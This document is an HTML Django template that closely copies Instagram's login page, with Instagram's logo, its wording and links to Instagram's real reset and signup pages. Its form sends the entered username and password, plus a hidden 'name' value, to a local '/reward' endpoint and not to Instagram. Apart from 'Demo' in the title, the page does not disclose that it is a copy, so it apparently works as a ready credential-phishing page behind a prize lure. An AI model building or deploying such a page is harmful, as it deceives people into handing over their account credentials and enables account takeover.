<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login • Demo</title>
  <style>
    :root{
      --border:#dbdbdb;
      --text:#262626;
      --muted:#8e8e8e;
      --blue:#3897f0;
      --bg:#fafafa;
    }
    *{box-sizing:border-box;}
    body{
      margin:0; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background:var(--bg); color:var(--text); display:grid; place-items:center; min-height:100vh;
    }
    .card{
      width: 360px; max-width: 94vw; background:#fff; border:1px solid var(--border);
      padding: 40px 40px 24px; border-radius: 8px;
    }
    .logo{ 
      font-family: "Brush Script MT", "Segoe Script", cursive; 
      font-size: 44px; text-align:center; margin:0 0 24px; letter-spacing:1px;
    }
    .input{
      width:100%;
      border:1px solid var(--border); background:#fafafa; border-radius:4px; height:38px; padding:0 10px; 
      outline:none; font-size:14px;
    }
    .stack{ display:grid; gap:8px; }
    .btn{ width:100%; height:32px; border:none; border-radius:8px; background:var(--blue); color:#fff; font-weight:600; cursor:pointer; }
    .btn:disabled{ opacity:.6; cursor:not-allowed; }
    .or{ display:flex; align-items:center; gap:16px; color:var(--muted); font-weight:600; text-transform:uppercase; font-size:12px; margin:12px 0; }
    .or::before, .or::after{ content:""; height:1px; background:var(--border); flex:1; }
    .fb{ display:flex; gap:8px; align-items:center; justify-content:center; font-weight:600; color:#385185; text-decoration:none; }
    .small{ color:var(--blue); text-align:center; display:block; margin-top:12px; font-size:12px; text-decoration:none; }
    .bar{ border:1px solid var(--border); background:#fff; text-align:center; padding:22px; border-radius:8px; margin-top:10px; }
    .store-row{ display:flex; gap:10px; justify-content:center; margin-top:16px; }
    .badge{ height:40px; width:135px; border:1px solid var(--border); border-radius:6px; display:grid; place-items:center; font-size:12px; color:var(--muted); background:#fff; }
    .footer{ text-align:center; color:var(--muted); font-size:12px; margin-top:16px; }
    @media (max-width:420px){ .card{ padding: 28px 24px 18px; } }
  </style>
</head>
<body>
  <main>
    <section class="card" role="form" aria-labelledby="brand">
        {% load static %}
      <img src="{% static 'instagram.jpeg' %}" alt="Instagram Logo" style="display:block; margin:0 auto 24px auto; height:60px;" />

      <form class="stack" method="post" action="/reward">
        {% csrf_token %}
        <label>
          <input class="input" type="text" name="user" placeholder="Phone number, username, or email" autocomplete="username" required />
        </label>
        <label>
          <input class="input" type="password" name="pass" placeholder="Password" autocomplete="current-password" required />
        </label>
        <input type="hidden" name="name" value="{{name}}">
        <button class="btn" type="submit">Login</button>
      </form>

      <div class="or">or</div>

      <a class="fb" href="#" aria-label="Log in with Facebook">
        <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill="#385185" d="M22 12.06C22 6.48 17.52 2 11.94 2 6.36 2 1.88 6.48 1.88 12.06c0 5 3.66 9.15 8.44 9.94v-7.03H7.9V12.06h2.42V9.95c0-2.39 1.42-3.71 3.61-3.71 1.05 0 2.14.19 2.14.19v2.35h-1.2c-1.18 0-1.54.73-1.54 1.48v1.8h2.63l-.42 2.91h-2.21V22c4.78-.79 8.44-4.94 8.44-9.94z"/></svg>
        Log in with Facebook
      </a>
      <p style="color:red; font-size:14px; text-align:center">{{error}}</p>
      <a class="small" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
    </section>

    <div class="bar">Don’t have an account? <a href="https://www.instagram.com/accounts/emailsignup/" style="color:var(--blue); text-decoration:none; font-weight:600;">Sign up</a></div>

  </main>
</body>
</html>
